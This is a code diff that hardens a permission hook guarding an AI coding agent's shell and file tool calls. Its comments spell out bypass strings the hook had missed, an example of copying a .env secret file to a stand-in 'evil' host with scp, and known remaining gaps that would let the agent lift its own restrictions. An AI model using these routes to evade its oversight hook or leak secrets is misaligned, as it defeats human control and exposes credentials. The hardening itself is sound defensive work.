@@ -49,6 +49,10 @@ const GUARD_STATE_FILE =
   path.join(os.homedir(), ".claude", "keystone-guard.json");
 
 // ── Files explicitly safe to access (templates / examples) ───────────────────
+// Each regex is anchored to the END of a single path. For Read/Edit/Write it is tested
+// against the file path; for Bash it is tested per shell word (see neutralizeAllowlisted),
+// never against the whole command — a whole-command test let `<anything> # .env.example`
+// skip every deny layer. No `g` flag: .test() with `g` carries lastIndex between calls.
 const ALLOWLIST = [
   /\.env\.example$/i,
   /\.env\.sample$/i,
@@ -441,18 +445,174 @@ const CAREFUL = [
 ];
 
 // ── Helpers ──────────────────────────────────────────────────────────────────
+/** True if a single file path (NOT a whole Bash command) is an allowlisted template. */
 function isAllowlisted(s) {
   return !!s && ALLOWLIST.some((re) => re.test(s));
 }
 
-/** Read the opt-in guard state file. Fails open to {} (no extra restrictions). */
-function readState(file = GUARD_STATE_FILE) {
-  try {
-    const s = JSON.parse(fs.readFileSync(file, "utf8"));
-    return s && typeof s === "object" ? s : {};
-  } catch (_) {
-    return {};
+// A "word" for allowlist purposes: a run of characters that are not whitespace, quotes,
+// backticks, shell operators/grouping, or `=` (so `--env-file=.env.example` splits).
+const SHELL_WORD = /[^\s'"`;|&<>()=]+/g;
+const ALLOWLIST_PLACEHOLDER = "_allowlisted_";
+// A word is never neutralized if it carries expansion, escape, or glob characters (bash may
+// split or expand it: `.env$IFS.env.example` reads .env), or a `:` — that marks a remote
+// destination (scp/rsync `host:path`, `host::module`, a URL), and erasing it would hide
+// the `:` the off-box exfil rules key on (`scp .env evil:x.env.example`).
+const SHELL_EXPANSION = /[$\\{}*?[\]:]/;
+
+/**
+ * Replace each shell word that is itself an allowlisted template path with a neutral
+ * placeholder, IN PLACE (separators are preserved, so the deny regexes still see the
+ * real command structure). Everything else — including any secret path or dangerous
+ * command sitting next to the template name — is left for the deny/ask layers.
+ *   `cat .env.example`         → `cat _allowlisted_`        (allowed)
+ *   `cat .env # .env.example`  → `cat .env # _allowlisted_` (still denied)
+ */
+function neutralizeAllowlisted(cmd) {
+  return String(cmd).replace(SHELL_WORD, (word) =>
+    isAllowlisted(word) && !SHELL_EXPANSION.test(word) ? ALLOWLIST_PLACEHOLDER : word,
+  );
+}
+
+// ── Guard state integrity: the model must not quietly lift its own fence ─────
+// /freeze, /careful, /guard, /unfreeze all run through the model's Bash tool, so the hook
+// cannot tell a user-typed /unfreeze from a model-initiated one. Rule: anything that could
+// REMOVE or WIDEN protection asks a human; forms that only ADD protection pass.
+// keystone: string matching only — obfuscated access (globs like keystone-g*, variables
+// built at runtime, interpreter one-liners that assemble the name, a copied script) is not
+// caught, freeze does not fence Bash at all, and when not frozen the model can Edit the
+// installed guard.js / guard-state.js themselves; upgrade trigger: a real bypass seen in
+// practice, or Claude Code exposing whether a tool call came from a user slash command.
+const STATE_BASENAME = "keystone-guard.json";
+const STATE_MENTION = /keystone-guard/i;
+const GUARD_STATE_CLI = /guard-state(?:\.js)?(?![\w.-])/gi;
+// One shell word as an optional directory argument: a plain word, or a quoted string with
+// no expansion/escape characters inside.
+const CLI_ARG = String.raw`(?:"[^"$\x60\\]*"|'[^']*'|[^\s"'$\x60\\;&|<>(){}]+)`;
+const CLI_STATUS = /^\s*status\s*$/;
+const CLI_CAREFUL_ON = /^\s*careful\s+on\s*$/;
+const CLI_FREEZE = new RegExp(String.raw`^\s*(?:freeze|guard)(?:\s+${CLI_ARG})?\s*$`);
+
+/** Guard state file paths worth matching beyond the default basename. */
+function stateFileCandidates(env) {
+  return [GUARD_STATE_FILE, env && env.KEYSTONE_GUARD_FILE]
+    .filter(Boolean)
+    .map((p) => path.resolve(p));
+}
+
+/**
+ * A DETECTION-ONLY copy of a command with the characters bash removes when it rejoins a
+ * word dropped: quotes, backslashes, backticks, and empty `$()` / `$''` / `$""`. So
+ * `keystone-gu''ard.json` and `guard\-state.js` are seen as the names bash will use.
+ * Never evaluate the command itself from this copy — it would mangle legitimate quoting.
+ */
+function dequoted(cmd) {
+  return String(cmd)
+    .replace(/\$(?:\(\s*\)|''|"")/g, "")
+    .replace(/['"\\`]/g, "");
+}
+
+/** Does this Bash command reference the guard state file directly? */
+function bashTouchesStateFile(cmd, env) {
+  const forms = [String(cmd), dequoted(cmd)];
+  if (forms.some((c) => STATE_MENTION.test(c))) return true;
+  return stateFileCandidates(env).some((p) => {
+    if (path.basename(p).toLowerCase() === STATE_BASENAME) return false; // covered above
+    return forms.some((c) => c.toLowerCase().includes(p.toLowerCase()));
+  });
+}
+
+/** Is this Read/Write target the guard state file? (case-insensitive: macOS default FS) */
+function isStateFilePath(fp, cwd, env) {
+  const abs = path.resolve(cwd || "", fp).toLowerCase();
+  if (path.basename(abs) === STATE_BASENAME) return true;
+  return stateFileCandidates(env).some((p) => p.toLowerCase() === abs);
+}
+
+/**
+ * True when every guard-state.js mention in `cmd` is an exact protection-ADDING form:
+ * `status`, `careful on`, or `freeze|guard [dir]` while no freeze is active (re-freezing
+ * an active boundary could widen it). Anything else — unfreeze, careful off, extra args,
+ * expansions, a bare mention, a copy — is treated as protection-removing. Fails closed.
+ * A mention that only appears once quotes/backslashes are removed (`guard-sta""te.js`) is
+ * an obfuscated invocation and is never protective. While the state file is corrupt the
+ * real boundary is unknown, so only `status` passes.
+ */
+function guardStateCallsAreProtective(cmd, state) {
+  cmd = String(cmd);
+  const count = (s) => (s.match(GUARD_STATE_CLI) || []).length;
+  if (count(dequoted(cmd)) > count(cmd)) return false;
+  const corrupt = !!(state && state.corrupt);
+  GUARD_STATE_CLI.lastIndex = 0;
+  let m;
+  while ((m = GUARD_STATE_CLI.exec(cmd)) !== null) {
+    let rest = cmd.slice(m.index + m[0].length);
+    if (/^["']/.test(rest)) rest = rest.slice(1); // closing quote of a quoted script path
+    // The script name must end the word. `guard-state.js"status;"` is a different file to
+    // bash, and as a decoy it would also vanish from the dequoted count above — so treat
+    // any glued suffix as non-protective. This keeps every protective raw match present in
+    // the dequoted copy, which is what makes the count check sound.
+    if (rest && !/^\s/.test(rest)) return false;
+    const segment = rest.split(/[;&|\n]/, 1)[0];
+    if (CLI_STATUS.test(segment)) continue;
+    if (corrupt) return false;
+    if (CLI_CAREFUL_ON.test(segment)) continue;
+    if (CLI_FREEZE.test(segment) && !(state && state.freeze)) continue;
+    return false;
   }
+  return true;
+}
+
+/**
+ * Why `s` is not a valid guard state, or null if it is. Valid: a plain object whose
+ * `freeze` is absent/null or a non-empty absolute path, and whose `careful` is
+ * absent or a boolean. Shared with guard-state.js so both sides agree on "corrupt".
+ */
+function stateShapeError(s) {
+  if (!s || typeof s !== "object" || Array.isArray(s)) return "not a JSON object";
+  if (s.freeze != null && (typeof s.freeze !== "string" || !path.isAbsolute(s.freeze))) {
+    return "freeze is not an absolute directory path";
+  }
+  if (s.careful !== undefined && typeof s.careful !== "boolean") {
+    return "careful is not true/false";
+  }
+  return null;
+}
+
+/**
+ * Read the opt-in guard state file.
+ *   - missing file (ENOENT / ENOTDIR) → {} (baseline: no extra restrictions)
+ *   - valid state                    → the state
+ *   - anything else (unreadable, invalid JSON, wrong shape) → FAIL CLOSED:
+ *     { careful: true, corrupt: <reason> }. A corrupt file used to read as {}, which
+ *     silently lifted an active freeze. The freeze boundary itself is unknowable, so
+ *     instead of guessing one, evaluate() asks before every Write/Edit and keeps careful
+ *     mode on until the file is repaired (guard-state.js freeze|guard|unfreeze).
+ */
+function readState(file = GUARD_STATE_FILE) {
+  let text;
+  try {
+    text = fs.readFileSync(file, "utf8");
+  } catch (e) {
+    if (e && (e.code === "ENOENT" || e.code === "ENOTDIR")) return {};
+    return { careful: true, corrupt: `unreadable (${(e && e.code) || "error"})` };
+  }
+  let s;
+  try {
+    s = JSON.parse(text);
+  } catch (_) {
+    return { careful: true, corrupt: "invalid JSON" };
+  }
+  const err = stateShapeError(s);
+  return err ? { careful: true, corrupt: err } : s;
+}
+
+/** How to repair a corrupt state file. guard-state.js can rewrite bad CONTENT, but not a
+ *  path it cannot read (a directory, a permissions problem) — that needs a manual fix. */
+function corruptStateHint(reason) {
+  return /^unreadable/.test(String(reason))
+    ? `fix or remove ${GUARD_STATE_FILE} by hand (guard-state.js cannot rewrite a path it cannot read)`
+    : "run `/freeze` or `/guard` to rewrite it, `/unfreeze` to clear it, or `guard-state.js status` to inspect it";
 }
 
 /** True if `target` resolves inside `dir`. Both should be absolute-ish paths. */
@@ -513,6 +673,21 @@ function discoveryGateMsg(risk) {
 }
 
 /**
+ * Coerce a tool-input field to text. Strings pass; absent → ""; an array of primitives is
+ * joined with spaces (so ["rm","-rf","~"] is judged as a command, not "rm,-rf,~"). Any
+ * other type returns null — the caller asks rather than letting a malformed input (or a
+ * throw on it, which main() would turn into "{}") become an allow.
+ */
+function asText(v) {
+  if (typeof v === "string") return v;
+  if (v === undefined || v === null) return "";
+  if (Array.isArray(v) && v.every((x) => x === null || typeof x !== "object")) {
+    return v.map((x) => String(x)).join(" ");
+  }
+  return null;
+}
+
+/**
  * Core decision. Returns { decision: 'deny'|'ask', why } or null to allow.
  * Exported for tests.
  */
@@ -523,11 +698,19 @@ function evaluate(
   cwd = "",
   state = readState(),
 ) {
+  env = env || {};
   if (env.KEYSTONE_GUARD_OFF === "1") return null;
+  cwd = typeof cwd === "string" ? cwd : "";
+  const input = toolInput && typeof toolInput === "object" ? toolInput : {};
 
   if (toolName === "Bash") {
-    const cmd = (toolInput && toolInput.command) || "";
-    if (isAllowlisted(cmd)) return null;
+    const raw = asText(input.command);
+    if (raw === null) {
+      return { decision: "ask", why: "the Bash command is not a string, so guard cannot check it" };
+    }
+    // Allowlisted template names are neutralized per word; the deny/ask layers then run
+    // on the remainder. Never short-circuit to allow on an allowlist hit.
+    const cmd = neutralizeAllowlisted(raw);
 
     // deny-level layers first (never legitimate)
     if (DANGEROUS_COMMANDS) {
@@ -537,6 +720,19 @@ function evaluate(
     if (SECRET_EXFIL) {
       const hit = matchFirst(EXFIL, cmd);
       if (hit) return { decision: "deny", why: hit.why };
+    }
+    // Guard state integrity (ask): checked on the RAW command, after the deny layers.
+    if (bashTouchesStateFile(raw, env)) {
+      return {
+        decision: "ask",
+        why: "this command touches the keystone guard state file directly (it holds the freeze/careful settings). Use /freeze, /careful, or /unfreeze instead",
+      };
+    }
+    if (!guardStateCallsAreProtective(raw, state)) {
+      return {
+        decision: "ask",
+        why: "this guard-state.js call could lift or widen keystone's guardrails (unfreeze, careful off, or re-freezing an active boundary). Approve only if you asked for it",
+      };
     }
     // ask-level layers (legitimate but consequential)
     // Databricks is stack-specific → opt-in via env, off by default.
@@ -558,8 +754,10 @@ function evaluate(
 
   const WRITE_TOOLS = ["Edit", "Write", "MultiEdit", "NotebookEdit"];
   if (toolName === "Read" || WRITE_TOOLS.includes(toolName)) {
-    const fp =
-      (toolInput && (toolInput.file_path || toolInput.notebook_path)) || "";
+    const fp = asText(input.file_path || input.notebook_path);
+    if (fp === null) {
+      return { decision: "ask", why: "the target file path is not a string, so guard cannot check it" };
+    }
 
     // Secret-file block (always on, every tool) — keep this first.
     if (
@@ -596,6 +794,23 @@ function evaluate(
       const risk = String(env.KEYSTONE_TASK_RISK).trim().toLowerCase();
       return { decision: "deny", why: discoveryGateMsg(risk) };
     }
+
+    // Corrupt state file (fail closed) — the freeze boundary is unknown, so confirm every
+    // edit until it is repaired. After the deny layers, so a deny still wins.
+    if (state && state.corrupt && WRITE_TOOLS.includes(toolName)) {
+      return {
+        decision: "ask",
+        why: `the keystone guard state file is ${state.corrupt}, so any freeze boundary is unknown — ${corruptStateHint(state.corrupt)}`,
+      };
+    }
+
+    // Guard state integrity (ask) — after every deny layer, so a deny always wins.
+    if (WRITE_TOOLS.includes(toolName) && fp && isStateFilePath(fp, cwd, env)) {
+      return {
+        decision: "ask",
+        why: "this edits the keystone guard state file directly (it holds the freeze/careful settings). Use /freeze, /careful, or /unfreeze instead",
+      };
+    }
     return null;
   }
 
@@ -611,15 +826,24 @@ async function main() {
       data.tool_name,
       data.tool_input,
       process.env,
-      data.cwd || "",
+      typeof data.cwd === "string" ? data.cwd : "",
       readState(),
     );
     if (result) {
       process.stdout.write(JSON.stringify(output(result.decision, result.why)));
       return;
     }
-  } catch (_) {
-    // fail open
+  } catch (e) {
+    // Fail closed: an unexpected error must not silently allow the call.
+    process.stdout.write(
+      JSON.stringify(
+        output(
+          "ask",
+          `keystone guard hit an internal error (${(e && e.message) || e}); approve only if you trust this call.`,
+        ),
+      ),
+    );
+    return;
   }
   process.stdout.write("{}");
 }
@@ -630,6 +854,7 @@ if (require.main === module) {
   module.exports = {
     evaluate,
     isAllowlisted,
+    neutralizeAllowlisted,
     matchFirst,
     output,
     DANGEROUS,
@@ -640,6 +865,12 @@ if (require.main === module) {
     CAREFUL,
     ALLOWLIST,
     readState,
+    stateShapeError,
+    asText,
+    GUARD_STATE_FILE,
+    bashTouchesStateFile,
+    isStateFilePath,
+    guardStateCallsAreProtective,
     isInside,
     needsDiscovery,
     discoveryGateMsg,
